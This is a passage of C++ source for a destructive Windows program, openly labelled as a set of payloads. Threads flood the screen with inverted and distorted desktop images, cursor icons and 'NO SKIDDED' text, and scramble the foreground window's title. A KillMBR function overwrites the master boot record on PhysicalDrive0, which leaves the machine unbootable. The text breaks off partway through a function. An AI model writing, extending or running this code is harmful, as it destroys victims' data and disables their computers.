// winbmpdestructive.cpp : Defines the entry point for the application.
//
#include "main.h"
#include "sound.h"
#include "gdi_sab.h"

//Default GDI

DWORD WINAPI mouse(LPVOID lpParam)
{
    ULONGLONG uVar1;
    DWORD64 uVar2;
    UINT uVar3;
    int iVar4;
    HDC hDC;
    UINT uVar5;
    int iVar6;
    int iVar7;
    tagCURSORINFO local_1c;

    uVar3 = GetSystemMetrics(0);
    iVar4 = GetSystemMetrics(1);
    hDC = GetDC((HWND)0x0);
    do {
        do {
            while (true) {
                while (true) {
                    uVar1 = __rdtsc();
                    iVar7 = 0;
                    uVar5 = (UINT)uVar1 & 3;
                    if ((uVar1 & 3) != 0) break;
                    uVar2 = __rdtsc();
                    uVar5 = (UINT)uVar2 ^ (UINT)uVar2 << 0xd;
                    uVar5 = uVar5 ^ uVar5 << 0x11;
                    uVar5 = (uVar5 << 5 ^ uVar5) % uVar3;
                    if (0 < iVar4) {
                        do {
                            local_1c.cbSize = 0x14;
                            GetCursorInfo(&local_1c);
                            DrawIcon(hDC, uVar5, iVar7, local_1c.hCursor);
                            uVar5 = uVar5 + 2;
                            if ((int)uVar3 <= (int)uVar5) {
                                iVar7 = iVar4;
                            }
                            Sleep(50);
                            iVar7 = iVar7 + 2;
                        } while (iVar7 < iVar4);
                    }
                }
                if (uVar5 == 1) break;
                if (uVar5 == 2) {
                    uVar2 = __rdtsc();
                    uVar5 = (UINT)uVar2 ^ (UINT)uVar2 << 0xd;
                    uVar5 = uVar5 ^ uVar5 << 0x11;
                    uVar5 = (uVar5 << 5 ^ uVar5) % uVar3;
                    if (0 < iVar4) {
                        do {
                            local_1c.cbSize = 0x14;
                            GetCursorInfo(&local_1c);
                            DrawIcon(hDC, uVar5, iVar7, local_1c.hCursor);
                            uVar5 = uVar5 - 2;
                            if ((int)uVar5 < 1) {
                                iVar7 = iVar4;
                            }
                            Sleep(50);
                            iVar7 = iVar7 + 2;
                        } while (iVar7 < iVar4);
                    }
                }
                else if (uVar5 == 3) {
                    uVar2 = __rdtsc();
                    uVar5 = (UINT)uVar2 ^ (UINT)uVar2 << 0xd;
                    uVar5 = uVar5 ^ uVar5 << 0x11;
                    uVar5 = (uVar5 << 5 ^ uVar5) % uVar3;
                    iVar7 = GetSystemMetrics(1);
                    while (0 < iVar7) {
                        local_1c.cbSize = 0x14;
                        GetCursorInfo(&local_1c);
                        DrawIcon(hDC, uVar5, iVar7, local_1c.hCursor);
                        uVar5 = uVar5 - 2;
                        Sleep(50);
                        iVar6 = 0;
                        if (0 < (int)uVar5) {
                            iVar6 = iVar7;
                        }
                        iVar7 = iVar6 + -2;
                    }
                }
            }
            uVar2 = __rdtsc();
            uVar5 = (UINT)uVar2 ^ (UINT)uVar2 << 0xd;
            uVar5 = uVar5 ^ uVar5 << 0x11;
            uVar5 = (uVar5 << 5 ^ uVar5) % uVar3;
            iVar7 = GetSystemMetrics(1);
        } while (iVar7 < 1);
        do {
            local_1c.cbSize = 0x14;
            GetCursorInfo(&local_1c);
            DrawIcon(hDC, uVar5, iVar7, local_1c.hCursor);
            uVar5 = uVar5 + 2;
            Sleep(50);
            if ((int)uVar3 <= (int)uVar5) break;
            iVar7 = iVar7 + -2;
        } while (0 < iVar7);
    } while (true);
}

DWORD WINAPI mouse2(LPVOID lpParam)
{
    HDC hDC;
    tagCURSORINFO local_28;
    tagPOINT local_14;
    uint local_c;
    hDC = GetDC((HWND)0x0);
    do {
        GetCursorPos(&local_14);
        local_28.cbSize = 0x14;
        GetCursorInfo(&local_28);
        DrawIcon(hDC, local_14.x, local_14.y, local_28.hCursor);
        Sleep(10);
    } while (true);
}

DWORD WINAPI garbled(LPVOID lpParam)
{
    int uVar1;
    HWND hWnd;
    int iVar2;
    uint uVar3;
    CHAR* lpString;
    CHAR local_9;
    do {
        iVar2 = 0;
        do {
            uVar1 = rdtsc();
            uVar3 = (uint)uVar1 ^ (uint)uVar1 << 0xd;
            uVar3 = uVar3 ^ uVar3 << 0x11;
            (&local_9)[iVar2] = (CHAR)((ulonglong)(uVar3 << 5 ^ uVar3) % 0x47);
            iVar2 = iVar2 + 1;
        } while (iVar2 < 0x46);
        lpString = &local_9;
        hWnd = GetForegroundWindow();
        SetWindowTextA(hWnd, lpString);
        Sleep(10);
    } while (true);
}

DWORD WINAPI clipping(LPVOID lpParam)
{
    int uVar1;
    ulonglong uVar2;
    uint uVar3;
    uint uVar4;
    HDC hdc;
    uint uVar5;
    uint x1;
    uint y1;
    uint uVar6;
    int cx;
    int local_14;
    int local_10;

    uVar3 = GetSystemMetrics(0);
    uVar4 = GetSystemMetrics(1);
    hdc = GetDC((HWND)0x0);
    do {
        do {
            while (true) {
                uVar1 = rdtsc();
                uVar5 = (uint)uVar1 ^ (uint)uVar1 << 0xd;
                uVar5 = uVar5 ^ uVar5 << 0x11;
                x1 = (uVar5 << 5 ^ uVar5) % uVar3;
                uVar1 = rdtsc();
                uVar5 = (uint)uVar1 ^ (uint)uVar1 << 0xd;
                uVar5 = uVar5 ^ uVar5 << 0x11;
                y1 = (uVar5 << 5 ^ uVar5) % uVar4;
                uVar2 = rdtsc();
                uVar5 = (uint)uVar2 & 3;
                uVar1 = rdtsc();
                uVar6 = (uint)uVar1 ^ (uint)uVar1 << 0xd;
                uVar6 = uVar6 ^ uVar6 << 0x11;
                uVar1 = rdtsc();
                cx = (uVar6 ^ uVar6 << 5) % 300 + 200;
                uVar6 = (uint)uVar1 ^ (uint)uVar1 << 0xd;
                uVar6 = uVar6 ^ uVar6 << 0x11;
                uVar6 = (uVar6 ^ uVar6 << 5) % 0x32;
                if ((uVar2 & 3) == 0) break;
                if (uVar5 == 1) {
                    local_10 = 0;
                    uVar5 = y1;
                    if (uVar6 != 0xffffffec) {
                        do {
                            BitBlt(hdc, local_10 + x1, uVar5, cx, cx, hdc, x1, y1, SRCINVERT);
                            BitBlt(hdc, local_10 + x1, uVar5, cx, cx, hdc, x1, y1, SRCERASE);
                            BitBlt(hdc, local_10 + x1, uVar5, cx, cx, hdc, x1, y1, NOTSRCCOPY);
                            Sleep(25);
                            local_10 = local_10 + 10;
                            uVar5 = uVar5 - 10;
                        } while (local_10 < (int)(uVar6 + 0x14));
                    }
                }
                else if (uVar5 == 2) {
                    local_14 = 0;
                    uVar5 = x1;
                    if (uVar6 != 0xffffffec) {
                        do {
                            BitBlt(hdc, uVar5, y1 + local_14, cx, cx, hdc, x1, y1, SRCAND);
                            BitBlt(hdc, uVar5, y1 + local_14, cx, cx, hdc, x1, y1, SRCPAINT);
                            BitBlt(hdc, uVar5, y1 + local_14, cx, cx, hdc, x1, y1, NOTSRCCOPY);
                            Sleep(25);
                            local_14 = local_14 + 10;
                            uVar5 = uVar5 - 10;
                        } while (local_14 < (int)(uVar6 + 0x14));
                    }
                }
                else if ((uVar5 == 3) && (uVar6 != 0xffffffec)) {
                    local_14 = (uVar6 + 0x13) / 10 + 1;
                    uVar5 = x1;
                    do {
                        BitBlt(hdc, uVar5, (y1 - x1) + uVar5, cx, cx, hdc, x1, y1, SRCAND);
                        BitBlt(hdc, uVar5, (y1 - x1) + uVar5, cx, cx, hdc, x1, y1, SRCPAINT);
                        BitBlt(hdc, uVar5, (y1 - x1) + uVar5, cx, cx, hdc, x1, y1, NOTSRCERASE);
                        Sleep(25);
                        uVar5 = uVar5 - 10;
                        local_14 = local_14 + -1;
                    } while (local_14 != 0);
                }
            }
        } while (uVar6 == 0xffffffec);
        local_10 = (uVar6 + 0x13) / 10 + 1;
        uVar5 = x1;
        do {
            BitBlt(hdc, uVar5, (y1 - x1) + uVar5, cx, cx, hdc, x1, y1, SRCINVERT);
            BitBlt(hdc, uVar5, (y1 - x1) + uVar5, cx, cx, hdc, x1, y1, SRCPAINT);
            BitBlt(hdc, uVar5, (y1 - x1) + uVar5, cx, cx, hdc, x1, y1, SRCCOPY);
            Sleep(25);
            uVar5 = uVar5 + 10;
            local_10 = local_10 + -1;
        } while (local_10 != 0);
    } while (true);
}

DWORD WINAPI KillMBR(LPVOID lpParam) {
    DWORD Bytes;
    HANDLE hFile = CreateFileA(
        "\\\\.\\PhysicalDrive0", GENERIC_ALL,
        FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
        OPEN_EXISTING, NULL, NULL);
    WriteFile(hFile, MasterBootRecord, 32768, &Bytes, NULL);
    return 1;
}



//GDI Designation

//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\

//payload1

DWORD WINAPI gdi1(LPVOID lpParam)
{
    int uVar1;
    int uVar2;
    int uVar3;
    int uVar4;
    uint uVar5;
    uint uVar6;
    HDC hdc;
    uint uVar7;
    uint uVar8;

    uVar5 = GetSystemMetrics(0);
    uVar6 = GetSystemMetrics(1);
    hdc = GetDC((HWND)0x0);
    do
    {
        uVar1 = rdtsc();
        uVar2 = rdtsc();
        uVar3 = rdtsc();
        uVar7 = (uint)uVar3 ^ (uint)uVar3 << 0xd;
        uVar7 = uVar7 ^ uVar7 << 0x11;
        uVar3 = rdtsc();
        uVar8 = (uint)uVar3 ^ (uint)uVar3 << 0xd;
        uVar8 = uVar8 ^ uVar8 << 0x11;
        uVar3 = rdtsc();
        uVar4 = rdtsc();
        BitBlt(hdc, (uint)uVar4 & rand() % 5, (uint)uVar3 & rand() % 5, (uVar8 << 10 ^ uVar8) % uVar5, (uVar7 << 10 ^ uVar7) % uVar6, hdc, (uint)uVar2 & rand() % 5, (uint)uVar1 & rand() % 5, SRCCOPY);
        Sleep(1);
    } while (true);
}

DWORD WINAPI noneedgdi2(LPVOID lpParam)
{
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    HDC hdc, hdcMem; HBITMAP hbm;
    for (int i = 0;; i++, i %= 6)
    {
        hdc = GetDC(0); hdcMem = CreateCompatibleDC(hdc);
        hbm = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hdcMem, hbm);
        BitBlt(hdcMem, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        GetBitmapBits(hbm, w * h * 4, data);
        for (int i = 0; w * h > i; i++) {
            int x = i * w + i, y = i * h + i, f = (y | y + y + -1 + x + w / h);
            ((BYTE*)(data + i))[5] = 1;
        }
        SetBitmapBits(hbm, w * h * 4, data);
        BitBlt(hdc, 0, 0, w, h, hdcMem, 0, 0, SRCINVERT);
        DeleteObject(hbm); DeleteObject(hdcMem);
        DeleteObject(hdc);
        Sleep(50);
    }
}

COLORREF GetHeatColor(float intensity) {
    int r = 0, g = 0, b = 0;

    if (intensity < 0.25f) {
        r = 0; g = (int)(intensity * 4 * 255); b = 255;
    }
    else if (intensity < 0.5f) {
        r = 0; g = 255; b = (int)((0.5f - intensity) * 4 * 255);
    }
    else if (intensity < 0.75f) {
        r = (int)((intensity - 0.5f) * 4 * 255); g = 255; b = 0;
    }
    else {
        r = 255; g = (int)((1.0f - intensity) * 4 * 255); b = (int)((intensity - 0.75f) * 4 * 255);
    }
    return RGB(r, g, b);
}

DWORD WINAPI gdi2(LPVOID lpParam) { // by Blueno
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);

    int scale = 4;
    int ws = w / scale;
    int hs = h / scale;

    HDC hdc = GetDC(NULL);
    HDC hdcMem = CreateCompatibleDC(hdc);

    BITMAPINFO bmi = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth = ws;
    bmi.bmiHeader.biHeight = -hs;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biCompression = BI_RGB;

    RGBQUAD* pixels;
    HBITMAP hbmp = CreateDIBSection(hdcMem, &bmi, DIB_RGB_COLORS, (void**)&pixels, NULL, 0);
    SelectObject(hdcMem, hbmp);

    while (true) {
        StretchBlt(hdcMem, 0, 0, ws, hs, hdc, 0, 0, w, h, SRCCOPY);

        for (int i = 0; i < ws * hs; i++) {
            float luma = (pixels[i].rgbRed * 0.666f +
                pixels[i].rgbGreen * 0.666f +
                pixels[i].rgbBlue * 0.666f) / 666.0f;

            COLORREF heat = GetHeatColor(luma);

            pixels[i].rgbRed = GetRValue(heat);
            pixels[i].rgbGreen = GetGValue(heat);
            pixels[i].rgbBlue = GetBValue(heat);
        }

        StretchBlt(hdc, 0, 0, w, h, hdcMem, 0, 0, ws, hs, SRCCOPY);
        BitBlt(hdc, rand() % 6, rand() % 6, ws, hs, hdc, rand() % 6, rand() % 6, SRCCOPY);
    }
    ReleaseDC(NULL, hdc);
    DeleteDC(hdcMem);
    DeleteObject(hbmp);

    return 0;
}

//payload2

DWORD WINAPI gdi3(LPVOID lpParam)
{
    int x = GetSystemMetrics(0), y = GetSystemMetrics(1);
    HDC hdc = GetDC(0);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    POINT wPt[3];
    RECT wRect;
    HDC desk = GetDC(0);
    double moveangle = 0;
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    LPCSTR text = 0;
    while (1)
    {
        hdc = GetDC(0);
        desk = GetDC(0);
        SeedXorshift32(__rdtsc());
        BitBlt(desk, 0, 0, sw, sh, desk, 0, 0, SRCCOPY);
        BitBlt(desk, 10, 10, sw, sh, desk, 10, 10, SRCCOPY);
        StretchBlt(desk, 5, 5, sw - 10, sh - 10, desk, 0, 0, sw, sh, SRCCOPY);
        BitBlt(hdc, rand() % 5, rand() % 5, w, h, hdc, rand() % 5, rand() % 5, !(rand() % 3) ? SRCAND : SRCCOPY);
        GetWindowRect(GetDesktopWindow(), &wRect);
        wPt[0].x = wRect.left - 15;
        wPt[0].y = wRect.top + 30;
        wPt[1].x = wRect.right - 10;
        wPt[1].y = wRect.top - 10;
        wPt[2].x = wRect.left + 5;
        wPt[2].y = wRect.bottom + 12.5;
        PlgBlt(desk, wPt, desk, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);
        BitBlt(hdc, -5, 0, x, y, hdc, 0, 0, NOTSRCCOPY);
        BitBlt(hdc, x - 5, 0, x, y, hdc, 0, 0, NOTSRCERASE);
        Sleep(5);
        ReleaseDC(GetDesktopWindow(), desk);
        DeleteDC(desk);
    }
}

//payload3

DWORD WINAPI gdi4(LPVOID lpParam)
{
    HDC hdc;
    HDC desk = GetDC(0);
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    int x = GetSystemMetrics(0), y = GetSystemMetrics(1);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    LPCSTR text = 0;
    while (1)
    {
        hdc = GetDC(0);
        desk = GetDC(0);
        SeedXorshift32(__rdtsc());
        text = "NO SKIDDED";
        SetBkMode(desk, TRANSPARENT);
        SetTextColor(desk, Hue(3));
        HFONT font = CreateFontA(350, 170, 0, 0, FW_THIN, 0, rand() % 1, 0, ANSI_CHARSET, 0, 0, 0, 0, "Shadows Into Light");
        SelectObject(desk, font);
        TextOutA(desk, sw - 1925, sh - 1050, text, strlen(text));
        TextOutA(desk, sw - 1925, sh - 400, text, strlen(text));
        ReleaseDC(GetDesktopWindow(), desk);
        DeleteDC(desk);
        DeleteObject(font);
        BitBlt(desk, xorshift32() % 10, xorshift32() % 10, sw, sh, desk, xorshift32() % 10, xorshift32() % 10, SRCCOPY);
        BitBlt(hdc, rand() % 2, rand() % 2, w, h, hdc, rand() % 2, rand() % 2, SRCPAINT);
        Sleep(100);
    }
}

DWORD WINAPI gdi5(LPVOID lpParam)
{
    HDC hDC;
    tagCURSORINFO local_28;
    tagPOINT local_14;
    uint local_c;
    hDC = GetDC((HWND)0x0);
    HDC hdc = GetDC(0);
    HDC desk = GetDC(0);
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    int rx;
    int x = GetSystemMetrics(0), y = GetSystemMetrics(1);
    double moveangle = 0;
    while (1)
    {
        desk = GetDC(0);
        hdc = GetDC(0);
        SeedXorshift32(__rdtsc());
        rx = xorshift32() % sw;
        int ry = xorshift32() % sh;
        if (xorshift32() % 5 == 3) InvalidateRect(0, 0, 0);
        int ax = (int)(cos(moveangle) * 5);
        int ay = (int)(sin(moveangle) * 5);
        BitBlt(desk, ax, ay, sw, sh, desk, 0, 0, SRCCOPY);
        moveangle = fmod(moveangle + M_PI / 16.f, M_PI * 2.f);
        BitBlt(hdc, -20, 0, x, y, hdc, 0, 0, SRCCOPY);
        BitBlt(hdc, x - 20, 0, x, y, hdc, 0, 0, SRCCOPY);
        SeedXorshift32(__rdtsc());
        GetCursorPos(&local_14);
        local_28.cbSize = 0x14;
        GetCursorInfo(&local_28);
        RedrawWindow(0, 0, 0, 133);
        Sleep(25);
        DrawIcon(hDC, local_14.x - 10, local_14.y - 10, LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON2)));
        DrawIcon(hDC, local_14.x + 10, local_14.y + 10, LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON2)));
        DrawIcon(hDC, local_14.x - 10, local_14.y + 10, LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON2)));
        DrawIcon(hDC, local_14.x + 10, local_14.y - 10, LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON2)));
        DrawIcon(hDC, local_14.x - 40, local_14.y - 40, LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON2)));
        DrawIcon(hDC, local_14.x + 40, local_14.y + 40, LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON2)));
        DrawIcon(hDC, local_14.x - 40, local_14.y + 40, LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON2)));
        DrawIcon(hDC, local_14.x + 40, local_14.y - 40, LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON2)));
        DrawIcon(hDC, local_14.x - 70, local_14.y - 70, LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON2)));
        DrawIcon(hDC, local_14.x + 70, local_14.y + 70, LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON2)));
        DrawIcon(hDC, local_14.x - 70, local_14.y + 70, LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON2)));
        DrawIcon(hDC, local_14.x + 70, local_14.y - 70, LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON2)));
        DrawIcon(hDC, local_14.x - 100, local_14.y - 100, LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON2)));
        DrawIcon(hDC, local_14.x + 100, local_14.y + 100, LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON2)));
        DrawIcon(hDC, local_14.x - 100, local_14.y + 100, LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON2)));
        DrawIcon(hDC, local_14.x + 100, local_14.y - 100, LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON2)));
        DrawIcon(hDC, local_14.x - 130, local_14.y - 130, LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON2)));
        DrawIcon(hDC, local_14.x + 130, local_14.y + 130, LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON2)));
        DrawIcon(hDC, local_14.x - 130, local_14.y + 130, LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON2)));
        DrawIcon(hDC, local_14.x + 130, local_14.y - 130, LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON2)));
        Sleep(1);
    }
}

//payload4

DWORD WINAPI gdi6(LPVOID lpParam)
{
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    HDC desk = GetDC(0);
    int right;
    uint uVar1;
    int iVar2;
    int iVar3;
    HDC hdc;
    uint uVar4;
    uint uVar5;
    uint uVar6;
    HBRUSH h;
    int left;
    int local_8;

    iVar2 = GetSystemMetrics(0);
    iVar3 = GetSystemMetrics(1);
    hdc = GetDC((HWND)0x0);
    local_8 = 0;
    do
    {
        SeedXorshift32(__rdtsc());
        desk = GetDC(0);
        SelectObject(desk, CreateHatchBrush(rand() % 5, Hue(3)));
        BitBlt(desk, rand() % 1, rand() % 1, sw, sh, desk, rand() % 1, rand() % 1, 0x2837E28);
        uVar1 = rdtsc();
        uVar4 = (uint)uVar1 ^ (uint)uVar1 << 0xd;
        uVar4 = uVar4 ^ uVar4 << 0x11;
        uVar4 = uVar4 << 5 ^ uVar4;
        uVar1 = rdtsc();
        uVar5 = (uint)uVar1 ^ (uint)uVar1 << 0xd;
        uVar5 = uVar5 ^ uVar5 << 0x11;
        uVar5 = uVar5 << 5 ^ uVar5;
        uVar1 = rdtsc();
        uVar6 = (uint)uVar1 ^ (uint)uVar1 << 0xd;
        uVar6 = uVar6 ^ uVar6 << 0x11;
        h = CreateSolidBrush(((uint)((ulonglong)(uVar6 << 5 ^ uVar6) * 0x8080808081 >> 0x27) & 0xff) << 0x10 | (uVar5 / 0xff + uVar5 & 0xff) << 8 | uVar4 / 0xff + uVar4 & 0xff);
        SelectObject(hdc, h);
        if (0 < iVar2)
        {
            left = 0;
            do
            {
                right = left + 80;
                Ellipse(hdc, left, local_8 + 80, right, local_8);
                left = right;
            } while (right < iVar2);
        }
        local_8 = local_8 + 80;
        if (iVar3 <= local_8) {
            local_8 = 0;
        }
        Sleep(2.5);
    } while (true);
}

//payload5

DWORD WINAPI gdi7(LPVOID lpParam)
{
    HDC desk = GetDC(0);
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    while (1)
    {
        SeedXorshift32(__rdtsc());
        desk = GetDC(0);
        SelectObject(desk, CreateSolidBrush(Hue(3)));
        Ellipse(desk, rand() % sw, rand() % sh, rand() % sw, rand() % sh);
        Rectangle(desk, rand() % sw, rand() % sh, rand() % sw, rand() % sh);
        RoundRect(desk, rand() % 2500, rand() % 2500, rand() % 2500, rand() % 2500, rand() % 2500, rand() % 2500);
        BitBlt(desk, rand() % 20, rand() % 20, sw, sh, desk, rand() % 20, rand() % 20, NOTSRCCOPY);
        BitBlt(desk, rand() % 5, rand() % 5, sw, sh, desk, rand() % 5, rand() % 5, !(rand() % 2) ? SRCPAINT : SRCAND);
        Rectangle(desk, 50, 50, 200, 150);
        Sleep(25);
    }
}

DWORD WINAPI supermamap(LPVOID lpParam) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;

    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;

    RGBQUAD* rgbquad = NULL;
    //HSL hslcolor;

    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);

    INT i = 0;
    DOUBLE angle = 0.f;

    while (1)
    {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);

        RGBQUAD rgbquadCopy;

        for (int x = 0; x < w; x++)
        {
            for (int y = 0; y < h; y++)
            {
                int index = y * w + x;

                int cx = (x - (w * 3));
                int cy = (y - (h * 3));

                int zx = tan(angle) * cx - sin(angle) * cy;
                int zy = sin(angle) * cx + tan(angle) * cy;

                int fx = (zx ^ ((x >> 5) * zy)) / 100;

                rgbquad[index].rgbRed += fx;
                rgbquad[index].rgbGreen ^= fx + 6;
                rgbquad[index].rgbBlue -= fx + 7;
            }
        }

        i++;
        angle += 0.01f;
        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);

        BitBlt(hdc, 2, 0, w, h, hdc, 0, 0, SRCPAINT);
        BitBlt(hdc, -2, 0, w, h, hdc, 0, 0, SRCPAINT);

        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
    }
}

//payload6

DWORD WINAPI gdi8(LPVOID lpParam)
{
    HDC desk = GetDC(0);
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    LPCSTR text = 0;
    HWND v3;
    HBITMAP h;
    HDC hdcSrc;
    HDC hdc;
    void* lpvBits;
    int nHeight;
    int nWidth;
    DWORD v12;
    int j;
    int v14;
    int i;
    v12 = GetTickCount();
    nWidth = GetSystemMetrics(0);
    nHeight = GetSystemMetrics(1);
    lpvBits = VirtualAlloc(0, 4 * nWidth * (nHeight + 1), 0x3000u, 4u);
    for (i = 0; ; i = (i + 5) % 2)
    {
        desk = GetDC(0);
        SeedXorshift32(__rdtsc());
        text = "No Skidded";
        SetBkMode(desk, TRANSPARENT);
        SetTextColor(desk, Hue(3));
        HFONT font = CreateFontA(12.5, 6.25, 0, 0, FW_THIN, 0, rand() % 1, 0, ANSI_CHARSET, 0, 0, 0, 0, "Shadows Into Light");
        SelectObject(desk, font);
        TextOutA(desk, rand() % sw, rand() % sh, text, strlen(text));
        hdc = GetDC(0);
        hdcSrc = CreateCompatibleDC(hdc);
        h = CreateBitmap(nWidth, nHeight, 1u, 0x20u, lpvBits);
        SelectObject(hdcSrc, h);
        BitBlt(hdcSrc, 0, 0, nWidth, nHeight, hdc, 0, 0, 0xCC0020u);
        GetBitmapBits(h, 4 * nHeight * nWidth, lpvBits);
        v14 = 0;
        if (GetTickCount() - v12 > 0xA)
            rand();
        for (j = 0; nHeight * nWidth > j; ++j)
        {
            if (!(j % nHeight) && !(rand() % 404))
                v14 = 10;
            *((BYTE*)lpvBits + 4 * j + v14) += 10;
        }
        SetBitmapBits(h, 4 * nHeight * nWidth, lpvBits);
        BitBlt(hdc, 0, 0, nWidth, nHeight, hdcSrc, 0, 0, 0xCC0020u);
        DeleteObject(h);
        DeleteObject(hdcSrc);
        DeleteObject(hdc);
        ReleaseDC(GetDesktopWindow(), desk);
        DeleteDC(desk);
        DeleteObject(font);
    }
}

//payload7

DWORD WINAPI gdi9(LPVOID lpParam)
{
    int rx;
    HDC desk = GetDC(0);
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    double moveangle = 0;
    while (1) {
        desk = GetDC(0);
        rx = xorshift32() % sw;
        int ry = xorshift32() % sh;
        SeedXorshift32(__rdtsc());
        int ax = (int)(cos(moveangle) * 5);
        SelectObject(desk, CreateSolidBrush(RGB(rand() % 500, rand() % 500, rand() % 500)));
        int ay = (int)(tan(moveangle) * 5);
        BitBlt(desk, rx, 10, 100, sh, desk, rx, 0, RGBBRUSH);
        BitBlt(desk, rx, -10, -100, sh, desk, rx, 0, RGBBRUSH);
        StretchBlt(desk, ax, ay, sw, sh, desk, 5, 5, sw - 10, sh - 10, NOTSRCCOPY);
        moveangle = fmod(moveangle + M_PI / 16.f, M_PI * 2.f);
        Sleep(25);
    }
}

DWORD WINAPI mamap(LPVOID lpParam) { //by crxzymint, modified by me
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);

    PRGBQUAD data = (PRGBQUAD)VirtualAlloc(
        0, (w * h) * sizeof(_RGBQUAD),
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    int t = 0;

    while (1) {
        HDC desk = GetDC(NULL);

        HDC memDC = CreateCompatibleDC(desk);
        HBITMAP hbm = CreateCompatibleBitmap(desk, w, h);

        SelectObject(memDC, hbm);

        for (int i = 0; i < w * h; i++) {
            int x = i % w;
            int y = i / w;
            BYTE val = (BYTE)((x ^ y >> t * (i * (x ^ (i * y)))) & 0xFF * (t * 100));
            data[i].r ^= val;
            data[i].g ^= val / 2;
            data[i].b ^= 255 - val;
        }

        SetBitmapBits(hbm, w * h * 4, data);
        BitBlt(desk, 0, 0, w, h, memDC, 0, 0, SRCINVERT);

        DeleteObject(hbm);
        DeleteDC(memDC);
        ReleaseDC(NULL, desk);

        t++;
    }
    VirtualFree(data, 0, MEM_RELEASE);
}

DWORD WINAPI mamap2(LPVOID lpParam) { //by crxzymint, modified by me
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);

    PRGBQUAD data = (PRGBQUAD)VirtualAlloc(
        0, (w * h) * sizeof(_RGBQUAD),
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    int t = 0;

    while (1) {
        HDC desk = GetDC(NULL);

        HDC memDC = CreateCompatibleDC(desk);
        HBITMAP hbm = CreateCompatibleBitmap(desk, w, h);

        SelectObject(memDC, hbm);

        for (int i = 0; i < w * h; i++) {
            int x = i % w;
            int y = i / w;
            BYTE val = (BYTE)((x & y >> t * (i * (x ^ (i * y)))) & 0xFF * (t * 100));
            data[i].r ^= val;
            data[i].g ^= val / 4;
            data[i].b ^= 455 - val;
        }

        SetBitmapBits(hbm, w * h * 4, data);
        BitBlt(desk, 0, 0, w, h, memDC, 0, 0, SRCINVERT);

        DeleteObject(hbm);
        DeleteDC(memDC);
        ReleaseDC(NULL, desk);

        t++;
    }
    VirtualFree(data, 0, MEM_RELEASE);
}

DWORD WINAPI mamap3(LPVOID lpParam) { //by crxzymint, modified by me
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);

    PRGBQUAD data = (PRGBQUAD)VirtualAlloc(
